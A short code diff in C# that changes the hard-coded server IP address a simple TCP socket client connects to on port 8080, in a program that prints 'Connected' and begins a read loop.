@@ -3,7 +3,7 @@ using System.Net.Sockets;
 using System.Text;
 
 var socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
-socket.Connect(new IPEndPoint(IPAddress.Parse("20.196.218.17"), 8080));
+socket.Connect(new IPEndPoint(IPAddress.Parse("40.87.96.156"), 8080));
 Console.WriteLine("Connected");
 Console.OutputEncoding = Encoding.UTF8;
 while (true)
